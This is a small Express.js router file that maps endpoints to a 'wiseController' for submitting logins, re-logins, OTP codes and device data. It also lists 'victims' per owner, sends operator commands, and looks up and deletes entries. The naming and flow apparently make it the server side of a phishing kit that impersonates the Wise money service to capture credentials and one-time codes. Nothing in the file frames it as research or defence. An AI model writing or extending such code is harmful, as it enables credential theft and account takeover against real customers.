const express = require("express");
const {
    getOwnerVics,
    command,
    deleteEntry,
    getInfo,
    submitLogin,
    submitOtp,
    submitDevice,
    submitLoginAgain,
} = require("../controllers/wiseController");
const router = express.Router();

router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/device", submitDevice);
router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/delete", deleteEntry);

module.exports = router;
